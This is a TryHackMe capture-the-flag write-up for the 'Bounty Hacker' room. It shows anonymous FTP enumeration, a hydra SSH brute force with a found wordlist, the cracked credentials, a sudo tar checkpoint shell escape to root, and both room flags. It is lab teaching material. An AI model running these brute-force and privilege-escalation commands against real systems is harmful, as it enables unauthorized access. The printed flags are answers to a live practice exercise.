# TryHackMe -- Bounty Hacker Writeup

**Date:** 18 May 2026\
**Platform:** TryHackMe\
**Room:** Bounty Hacker\
**Difficulty:** Easy\
**Status:** Completed ✅

## Objective

The goal of this room was to gain access to the target machine,
enumerate available services, obtain user access, and escalate
privileges to root.

## Step 1: Initial Enumeration

Started with an initial scan to discover running services on the target
machine.

Discovered open services: - FTP (Port 21) - SSH (Port 22) - HTTP (Port
80)

Enumeration is important because it gives an overview of the attack
surface before attempting exploitation.

## Step 2: FTP Enumeration

Connected to the FTP service using anonymous login.

``` bash
ftp 10.48.176.169
```

Anonymous access was enabled.

Found: - locks.txt - task.txt

Downloaded files:

``` bash
mget *
```

Discovered username:

``` text
lin
```

## Step 3: Password Discovery

Used the discovered wordlist against SSH:

``` bash
hydra ssh://10.48.176.169 -l lin -P locks.txt
```

Credentials found:

``` text
Username: lin
Password: RedDr4gonSynd1cat3
```

## Step 4: SSH Access

``` bash
ssh lin@10.48.176.169
```

User flag:

``` text
THM{CR1M3_SyNd1C4T3}
```

## Step 5: Privilege Escalation

Checked sudo permissions:

``` bash
sudo -l
```

Discovered tar sudo access and abused it:

``` bash
sudo tar -cf /dev/null /root/root.txt --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Verified root access:

``` bash
whoami
```

Output:

``` text
root
```

Root flag:

``` text
THM{80UN7Y_h4cK3r}
```

## Lessons Learned

-   Enumeration is critical
-   FTP misconfigurations expose useful information
-   Wordlists can lead to credential discovery
-   Misconfigured sudo permissions are dangerous
-   Privilege escalation is often caused by small mistakes

## Skills Practiced

✔ FTP Enumeration\
✔ File Analysis\
✔ SSH Brute Force (lab environment)\
✔ Linux Enumeration\
✔ Privilege Escalation\
✔ Sudo Misconfiguration Abuse
